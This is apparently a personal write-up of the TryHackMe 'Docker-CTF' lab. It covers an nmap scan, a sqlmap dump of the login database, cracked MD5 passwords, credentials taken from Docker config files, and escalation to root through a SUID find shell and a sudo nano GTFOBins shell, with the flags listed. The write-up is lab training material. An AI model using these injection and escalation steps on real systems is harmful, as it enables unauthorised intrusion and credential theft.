
# Docker-CTF
https://tryhackme.com/room/docker-ctf

10.82.139.112

# nmap
```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)

23/tcp   open  ssh     syn-ack ttl 61 OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)

3306/tcp open  mysql   syn-ack ttl 61 MySQL 8.0.40
|_ssl-date: TLS randomness does not represent time
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.40
|   Thread ID: 10
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, SupportsTransactions, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, SwitchToSSLAfterHandshake, InteractiveClient, Speaks41ProtocolNew, SupportsLoadDataLocal, ConnectWithDatabase, LongPassword, SupportsCompression, FoundRows, DontAllowDatabaseTableColumn, ODBCClient, LongColumnFlag, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: \x0BfzQ\x16w}K~328\x08J\x01z-@\x07\x1D
|_  Auth Plugin Name: caching_sha2_password
| ssl-cert: Subject: commonName=MySQL_Server_8.0.40_Auto_Generated_Server_Certificate
| Issuer: commonName=MySQL_Server_8.0.40_Auto_Generated_CA_Certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption

8080/tcp open  http    syn-ack ttl 61 nginx 1.27.2
|_http-title: Login
| http-robots.txt: 1 disallowed entry 
|_/
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.27.2
```

# web - port 8080
robots.txt
```
User-agent: *
Disallow: /

<--!Hey king, I have found some SQL injection vulnerabilities in our login form, could you fix them please, Gleb.-->
```

```
cat req.txt                                          
POST /login.php HTTP/1.1
Host: 10.82.139.112:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.82.139.112:8080/
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Origin: http://10.82.139.112:8080
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache

username=1&password=1


└─$ sqlmap -r req.txt --dump-all
        ___

:58] [INFO] fetching tables for databases: 'information_schema, mysql, performance_schema, sys, webchik'


sqlmap -r req.txt -D webchik --dump-all
etching columns for table 'users' in database 'webchik'
[11:18:47] [INFO] retrieved: 4
[11:18:52] [INFO] retrieved: id
[11:18:59] [INFO] retrieved: username
[11:19:26] [INFO] retrieved: password
[11:19:59] [INFO] retrieved: type
[11:20:17] [INFO] fetching entries for table 'users' in database 'webchik'
[11:20:17] [INFO] fetching number of entries for table 'users' in database 'webchik'
[11:20:17] [INFO] retrieved: 2
[11:20:20] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                        
MD5
[11:20:34] [INFO] retrieved: 1
[11:20:37] [INFO] retrieved: d534b96c9c231037a98126891ec898eb
[11:22:50] [INFO] retrieved: king
[11:23:06] [INFO] retrieved: MD5
[11:23:17] [INFO] retrieved: 
[11:23:22] [ERROR] invalid character detected. retrying..
[11:23:22] [WARNING] increasing time delay to 2 seconds
2
[11:23:29] [INFO] retrieved: 9f27410725ab8cc8854a2769c7a516b8
[11:27:20] [INFO] retrieved: bippa
[11:27:55] [INFO] recognized possible password hashes in column 'password'
```

king:Password12345


```
Hi king, I remind you about our new Database credentials:
root:ZXGPK9tk7s0RPqp3Q8d1Hy5MZRw=        
```

bippa:green
```
Hi bippa, I remind you about our new Database credentials:
root:ZXGPK9tk7s0RPqp3Q8d1Hy5MZRw=
```

# DB password : `ZXGPK9tk7s0RPqp3Q8d1Hy5MZRw=`


# mysql - port 3306
```
mysql -h 10.82.139.112 -u root -p --skip-ssl
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 2286
Server version: 8.0.40 MySQL Community Server - GPL


MySQL [(no
2 rows in set (0.084 sec)

MySQL [(none)]> use webchik
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [webchik]> show tables
    -> ;
+-------------------+
| Tables_in_webchik |
+-------------------+
| important         |
| users             |
+-------------------+
2 rows in set (0.087 sec)

MySQL [webchik]> select * from important;
+----+------------------+
| id | site             |
+----+------------------+
|  1 | crackstation.net |
+----+------------------+
1 row in set (0.078 sec)

MySQL [webchik]> select * from users;
+----+----------+----------------------------------+------+
| id | username | password                         | type |
+----+----------+----------------------------------+------+
|  1 | king     | d534b96c9c231037a98126891ec898eb | MD5  |
|  2 | bippa    | 9f27410725ab8cc8854a2769c7a516b8 | MD5  |
+----+----------+----------------------------------+------+

```

# ssh - port 22
```
ssh king@$IP
Password12345
```

# user.txt `MAIN_FLAG{4ToMcQTiz2DwArvLvX1LYKb+arNRARbIBQ==}`


```

king@docker-ctf:~/docker-web$ ls -la
total 64
drwxr-xr-x 6 root             root  4096 Jan  8  2026 .
drwxr-xr-x 5 king             king  4096 Jan 25  2025 ..
-rw-r----- 1 root             root   371 Aug 21  2024 crontab
-rw-r--r-- 1 root             root  1100 Aug 21  2024 default.conf
-rw-r----- 1 root             root   165 Jan  8  2026 demotivation
-rw-r--r-- 1 root             root  1056 Feb  1  2025 docker-compose.yaml
dr-------- 2 root             root  4096 Aug 21  2024 flags
drwxr-xr-x 3 root             root  4096 Jan  8  2026 html
drwxr-xr-x 2 root             root  4096 Aug 21  2024 initdb
drwxr-xr-x 8 systemd-coredump root  4096 Aug 23 14:57 mysql
-rw-r--r-- 1 root             root  1684 Jan 25  2025 nginx.Dockerfile
-rw-r--r-- 1 root             root    88 Nov 11  2024 php-fpm.Dockerfile
-rwx------ 1 root             root 10240 Aug 21  2024 .ssh.tar
-rw-r----- 1 root             root  1894 Aug 21  2024 sudoers

er-web$ cat docker-compose.yaml
version: "3.8"
services:
    web:
        build:
            context: .
            dockerfile: nginx.Dockerfile
        container_name: web
        restart: unless-stopped
        dns:
            - 1.1.1.1
            - 1.0.0.1
        ports:
            - "23:22"
            - "8080:8080"
        depends_on:
            - php-fpm
            - mysql
        volumes:
            - ./html/logs:/home/gleb/html/logs

    php-fpm:
        build:
            context: .
            dockerfile: php-fpm.Dockerfile
        container_name: php-fpm
        restart: unless-stopped
        depends_on:
            - mysql
        volumes:
            - ./html/logs:/var/www/html/logs

    mysql:
        image: mysql:8.0.40-debian
        container_name: mysql
        restart: unless-stopped
        ports:
            - "3306:3306"
        environment:
            MYSQL_DATABASE: webchik
            MYSQL_ROOT_PASSWORD: "ZXGPK9tk7s0RPqp3Q8d1Hy5MZRw="
        volumes:
            - ./mysql:/var/lib/mysql
            - ./initdb:/docker-entrypoint-initdb.d


king@docker-ctf:~/docker-web$ cat nginx.Dockerfile
FROM nginx:1.27.2

# Installing needed software
RUN apt-get update && \
    apt-get install -y sudo nano openssh-server cron ncat net-tools && \

    echo "Cleaning cache" \
    && apt-get autoremove \
    && apt-get clean \
    && rm -rf /var/lib/apt/lists/*

# Adding users | passwords | .bash_history > /dev/null
RUN useradd -m gleb && useradd -m rebeca && \
    echo "gleb:36bfX1mATPcFyVzWX2y0cRf930k=" | chpasswd && \
    echo rebeca:$(openssl rand -base64 20) | chpasswd && \
    ln -sf /dev/null /home/gleb/.bash_history && \
    ln -sf /dev/null /home/rebeca/.bash_history && \
    ln -sf /dev/null /root/.bash_history

# for ssh
ADD ./.ssh.tar /home/rebeca/
RUN mkdir -p /var/run/sshd && \
    sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin no/' /etc/ssh/sshd_config && \
    chmod 700 -R /home/rebeca/.ssh && chown rebeca:rebeca -R /home/rebeca/.ssh

# FLAGS
COPY --chown=gleb:gleb --chmod=600 ./flags/gleb.txt /home/gleb/gleb.txt
COPY --chown=rebeca:rebeca --chmod=600 ./flags/rebeca.txt /home/rebeca/rebeca.txt
COPY --chown=root:root --chmod=600 ./flags/docker-root.txt /root/docker-root.txt

# figure out yourself)))
COPY ./default.conf /etc/nginx/conf.d/default.conf
COPY ./html /home/gleb/html
COPY --chmod=644 ./crontab /etc/crontab
COPY --chmod=644 ./demotivation /root/demotivation
COPY --chown=root:root --chmod=440 ./sudoers /etc/sudoers

RUN crontab /etc/crontab && \
    chown rebeca:root /usr/bin/find && \
    chmod u+s /usr/bin/find && \
    chown gleb:gleb -R /home/gleb/html && \
    chown root:root /home/gleb/html/logs && chmod 777 /home/gleb/html/logs

EXPOSE 8080 22

CMD service ssh start && service cron start && nginx -g 'daemon off;'

king@docker-ctf:~/docker-web$ 

```
gleb:36bfX1mATPcFyVzWX2y0cRf930k=



# ssh - port 23

```
ssh gleb@$IP -p 23
```

# gleb.txt `FLAG{7XXPJr1fZ8ZzokIGG2zPb3pqRy2+kEKElg==}`




```
    chown rebeca:root /usr/bin/find && \
    chmod u+s /usr/bin/find && \
    chown gleb:gleb -R /home/gleb/html && \
    chown root:root /home/gleb/html/logs && chmod 777 /home/gleb/html/logs

vardı o yüzden

https://gtfobins.org/gtfobins/find/#shell

ls -l /usr/bin/find
-rwsr-xr-x 1 rebeca root 224848 Jan  8  2023 /usr/bin/find
gleb@6f9f59096dec:/$ 

 find . -exec /bin/sh -p \; -quit
$ id
uid=1000(gleb) gid=1000(gleb) euid=1001(rebeca) groups=1000(gleb)
$ You should try harder.

```
rebeca olduk.

# rebeca.txt `FLAG{FVS3p1C+3D5LpHE+UrFNa3sJqY0ZnoCnBA==}`
.sshdan ssh ile girdim 

```
:/docker-entrypoint.d$ cd .. 
rebeca@6f9f59096dec:/$ Are you sure this is the right way?
You should try harder.
Tt's so easy... isn't it??
sudo -l
Matching Defaults entries for rebeca on 6f9f59096dec:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User rebeca may run the following commands on 6f9f59096dec:
    (ALL : ALL) NOPASSWD: /usr/bin/nano
    (ALL : ALL) NOPASSWD: /usr/bin/sudo -l

```

https://gtfobins.org/gtfobins/nano/#shell

```

                                                         [ Executing... ]# id
uid=0(root) gid=0(root) groups=0(root)er            ^S Spell Check            ^J Full Justify           ^V Cut Till End
you have mail             M-\ Pipe Text             ^Y Linter                 ^O Formatter              ^Z Suspend
you have mail
# 

```

# docker-root.txt `DOCKER_FLAG{RcB+VKVQkcwkSzvEbXO/YBeOVFcjFn+1GA==}`


```
/# ls -l /var/run/docker.sock /run/docker.sock 2>/dev/null
root@6f9f59096dec:/# mount | column -t
bash: column: command not found
root@6f9f59096dec:/# 

root@6f9f59096dec:/# cat /proc/1/status | grep Cap
CapInh:	0000000000000000
CapPrm:	00000000a80425fb
CapEff:	00000000a80425fb
CapBnd:	00000000a80425fb
CapAmb:	0000000000000000
root@6f9f59096dec:/# 


cat /proc/self/mountinfo
2352 1759 0:58 / / rw,relatime - overlay overlay rw,lowerdir=/var/snap/docker/common/var-lib-docker/overlay2/l/IMK5DJYJUCF4NRZYHOSW
74NC23:/var/snap/docker/common/var-lib-docker/overlay2/l/QK2YAAQOCSKEJ6AKHDZBKST4XP:/var/snap/docker/common/var-lib-docker/overlay2
/l/Q3RURP3DX6RQH57XYJ2YE5HHZL:/var/snap/docker/common/var-lib-docker/overlay2/l/Z45NY7EZ6FTECYR4J7WFAKGFBM:/var/snap/docker/common/
var-lib-docker/overlay2/l/MTLIQPNZNMOO6LWOYRHE7VT5ZS:/var/snap/docker/common/var-lib-docker/overlay2/l/SE5MKZWXQQVFYRNIAEMBCKD5XT:/
var/snap/docker/common/var-lib-docker/overlay2/l/SRJQ3HTUWH4267KRTZE643UDEW:/var/snap/docker/common/var-lib-docker/overlay2/l/3AJ4J
P6KW4XFQ53QPX3GCPLYLJ:/var/snap/docker/common/var-lib-docker/overlay2/l/EW3UOLOWA565JZ5RXW3EFMWNIA:/var/snap/docker/common/var-lib-
docker/overlay2/l/5KHGU4SKFJVFS4ZAE4MK25NLZB:/var/snap/docker/common/var-lib-docker/overlay2/l/6JIT4GTTEYVORC4VG3NUHSEFNO:/var/snap
/docker/common/var-lib-docker/overlay2/l/SIQICJVQ7HUH2GLDEPNRV5XK5D:/var/snap/docker/common/var-lib-docker/overlay2/l/ENBDV3CKNNKZK
SZB74DS543DSE:/var/snap/docker/common/var-lib-docker/overlay2/l/W7AR7ZHZOBHBC775ULD42BKMLI:/var/snap/docker/common/var-lib-docker/o
verlay2/l/ZSI4FWVVFI5TWJA77WZBNYI7SV:/var/snap/docker/common/var-lib-docker/overlay2/l/SLFBTX3EO4XKLQMCA6AOCFPWJ5:/var/snap/docker/
common/var-lib-docker/overlay2/l/2UOWIKUMXKB7XKSO4CP73B6XGZ:/var/snap/docker/common/var-lib-docker/overlay2/l/ACQALAYSNN356S4SG4L7I
4MMXH:/var/snap/docker/common/var-lib-docker/overlay2/l/CKRVPTPYP7SAJHCLFPSSQODNNP:/var/snap/docker/common/var-lib-docker/overlay2/
l/UU6CGKKBH5SYO5KQ246WK2FMJG:/var/snap/docker/common/var-lib-docker/overlay2/l/5PMRXH675PVIFMHODVQXLI5BXZ,upperdir=/var/snap/docker
/common/var-lib-docker/overlay2/1d395eb31d234d07b1f05f9a9bd0801990f31b0b592b161cce9b08ddda65c536/diff,workdir=/var/snap/docker/comm
on/var-lib-docker/overlay2/1d395eb31d234d07b1f05f9a9bd0801990f31b0b592b161cce9b08ddda65c536/work,xino=off
2354 2352 0:72 / /proc rw,nosuid,nodev,noexec,relatime - proc proc rw
2355 2352 0:79 / /dev rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755
2361 2355 0:80 / /dev/pts rw,nosuid,noexec,relatime - devpts devpts rw,gid=5,mode=620,ptmxmode=666
2362 2352 0:81 / /sys ro,nosuid,nodev,noexec,relatime - sysfs sysfs ro
2370 2362 0:84 / /sys/fs/cgroup rw,nosuid,nodev,noexec,relatime - tmpfs tmpfs rw,mode=755
2372 2370 0:30 /docker/6f9f59096deccd4af1b57401e759888a4f8e6f135ff908e84bf3ea855944b755 /sys/fs/cgroup/systemd ro,nosuid,nodev,noex
ec,relatime master:11 - cgroup cgroup rw,xattr,name=systemd
2374 2370 0:33 /docker/6f9f59096deccd4af1b57401e759888a4f8e6f135ff908e84bf3ea855944b755 /sys/fs/cgroup/devices ro,nosuid,nodev,noex
ec,relatime master:15 - cgroup cgroup rw,devices
2379 2370 0:34 /docker/6f9f59096deccd4af1b57401e759888a4f8e6f135ff908e84bf3ea855944b755 /sys/fs/cgroup/memory ro,nosuid,nodev,noexe
c,relatime master:16 - cgroup cgroup rw,memory
2380 2370 0:35 /docker/6f9f59096deccd4af1b57401e759888a4f8e6f135ff908e84bf3ea855944b755 /sys/fs/cgroup/freezer ro,nosuid,nodev,noex
ec,relatime master:17 - cgroup cgroup rw,freezer
2383 2370 0:36 /docker/6f9f59096deccd4af1b57401e759888a4f8e6f135ff908e84bf3ea855944b755 /sys/fs/cgroup/cpu,cpuacct ro,nosuid,nodev,
--More--
noexec,relatime master:18 - cgroup cgroup rw,cpu,cpuacct
2386 2370 0:37 /docker/6f9f59096deccd4af1b57401e759888a4f8e6f135ff908e84bf3ea855944b755 /sys/fs/cgroup/blkio ro,nosuid,nodev,noexec
,relatime master:19 - cgroup cgroup rw,blkio
2389 2370 0:38 /docker/6f9f59096deccd4af1b57401e759888a4f8e6f135ff908e84bf3ea855944b755 /sys/fs/cgroup/net_cls,net_prio ro,nosuid,n
odev,noexec,relatime master:20 - cgroup cgroup rw,net_cls,net_prio
2391 2370 0:39 /docker/6f9f59096deccd4af1b57401e759888a4f8e6f135ff908e84bf3ea855944b755 /sys/fs/cgroup/hugetlb ro,nosuid,nodev,noex
ec,relatime master:21 - cgroup cgroup rw,hugetlb
1477 2370 0:40 /docker/6f9f59096deccd4af1b57401e759888a4f8e6f135ff908e84bf3ea855944b755 /sys/fs/cgroup/cpuset ro,nosuid,nodev,noexe
c,relatime master:22 - cgroup cgroup rw,cpuset
1481 2370 0:41 /docker/6f9f59096deccd4af1b57401e759888a4f8e6f135ff908e84bf3ea855944b755 /sys/fs/cgroup/perf_event ro,nosuid,nodev,n
oexec,relatime master:23 - cgroup cgroup rw,perf_event
1485 2370 0:42 /docker/6f9f59096deccd4af1b57401e759888a4f8e6f135ff908e84bf3ea855944b755 /sys/fs/cgroup/rdma ro,nosuid,nodev,noexec,
relatime master:24 - cgroup cgroup rw,rdma
1487 2370 0:43 /docker/6f9f59096deccd4af1b57401e759888a4f8e6f135ff908e84bf3ea855944b755 /sys/fs/cgroup/pids ro,nosuid,nodev,noexec,
relatime master:25 - cgroup cgroup rw,pids
1490 2355 0:71 / /dev/mqueue rw,nosuid,nodev,noexec,relatime - mqueue mqueue rw
1493 2355 0:92 / /dev/shm rw,nosuid,nodev,noexec,relatime - tmpfs shm rw,size=65536k
1494 2352 253:0 /var/snap/docker/common/var-lib-docker/containers/6f9f59096deccd4af1b57401e759888a4f8e6f135ff908e84bf3ea855944b755/
resolv.conf /etc/resolv.conf rw,relatime - ext4 /dev/mapper/ubuntu--vg-ubuntu--lv rw
1495 2352 253:0 /var/snap/docker/common/var-lib-docker/containers/6f9f59096deccd4af1b57401e759888a4f8e6f135ff908e84bf3ea855944b755/
hostname /etc/hostname rw,relatime - ext4 /dev/mapper/ubuntu--vg-ubuntu--lv rw
1496 2352 253:0 /var/snap/docker/common/var-lib-docker/containers/6f9f59096deccd4af1b57401e759888a4f8e6f135ff908e84bf3ea855944b755/
hosts /etc/hosts rw,relatime - ext4 /dev/mapper/ubuntu--vg-ubuntu--lv rw
1511 2352 253:0 /home/king/docker-web/html/logs /home/gleb/html/logs rw,relatime - ext4 /dev/mapper/ubuntu--vg-ubuntu--lv rw
1512 2354 0:72 /bus /proc/bus ro,nosuid,nodev,noexec,relatime - proc proc rw
1513 2354 0:72 /fs /proc/fs ro,nosuid,nodev,noexec,relatime - proc proc rw
1514 2354 0:72 /irq /proc/irq ro,nosuid,nodev,noexec,relatime - proc proc rw
1515 2354 0:72 /sys /proc/sys ro,nosuid,nodev,noexec,relatime - proc proc rw
1516 2354 0:72 /sysrq-trigger /proc/sysrq-trigger ro,nosuid,nodev,noexec,relatime - proc proc rw
--More--
517 2354 0:96 / /proc/acpi ro,relatime - tmpfs tmpfs ro
1518 2354 0:79 /null /proc/interrupts rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755
1519 2354 0:79 /null /proc/kcore rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755
1520 2354 0:79 /null /proc/keys rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755
1521 2354 0:79 /null /proc/timer_list rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755
1522 2354 0:79 /null /proc/sched_debug rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755
1523 2354 0:97 / /proc/scsi ro,relatime - tmpfs tmpfs ro
1

eca# cat /proc/1/cgroup
12:pids:/docker/6f9f59096deccd4af1b57401e759888a4f8e6f135ff908e84bf3ea855944b755
11:rdma:/docker/6f9f59096deccd4af1b57401e759888a4f8e6f135ff908e84bf3ea855944b755
10:perf_event:/docker/6f9f59096deccd4af1b57401e759888a4f8e6f135ff908e84bf3ea855944b755
9:cpuset:/docker/6f9f59096deccd4af1b57401e759888a4f8e6f135ff908e84bf3ea855944b755
8:hugetlb:/docker/6f9f59096deccd4af1b57401e759888a4f8e6f135ff908e84bf3ea855944b755
7:net_cls,net_prio:/docker/6f9f59096deccd4af1b57401e759888a4f8e6f135ff908e84bf3ea855944b755
6:blkio:/docker/6f9f59096deccd4af1b57401e759888a4f8e6f135ff908e84bf3ea855944b755
5:cpu,cpuacct:/docker/6f9f59096deccd4af1b57401e759888a4f8e6f135ff908e84bf3ea855944b755
4:freezer:/docker/6f9f59096deccd4af1b57401e759888a4f8e6f135ff908e84bf3ea855944b755
3:memory:/docker/6f9f59096deccd4af1b57401e759888a4f8e6f135ff908e84bf3ea855944b755
2:devices:/docker/6f9f59096deccd4af1b57401e759888a4f8e6f135ff908e84bf3ea855944b755
1:name=systemd:/docker/6f9f59096deccd4af1b57401e759888a4f8e6f135ff908e84bf3ea855944b755
0::/docker/6f9f59096deccd4af1b57401e759888a4f8e6f135ff908e84bf3ea855944b755
root@6f9f59096dec:/home/rebeca# 


cat /etc/crontab
# See cron(8) and crontab(5) for details.

# m h dom mon dow user command
*/1 * * * * root for i in $(/bin/ls /dev/pts); do /bin/echo $(/usr/bin/shuf -n 1 /root/demotivation) > /dev/pts/$i; done
*/1 * * * * root sleep 30; for i in $(/bin/ls /dev/pts); do /bin/echo $(/usr/bin/shuf -n 1 /root/demotivation) > /dev/pts/$i; done

ommand not found
root@6f9f59096dec:/home/rebeca# ifcongih
bash: ifcongih: command not found
root@6f9f59096dec:/home/rebeca# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.18.0.3  netmask 255.255.0.0  broadcast 172.18.255.255
        ether ee:d5:c2:5f:34:01  txqueuelen 0  (Ethernet)
        RX packets 90367  bytes 17728442 (16.9 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 90834  bytes 33162688 (31.6 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 3320  bytes 285488 (278.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3320  bytes 285488 (278.7 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@6f9f59096dec:/home/rebeca# 



```

# root.txt : `MAIN_FLAG{rdTyxhnAn5GYGocENB7JSAW5i0H3XELkjyQl1ZhpDIyaNfEjQa8fVQ==}`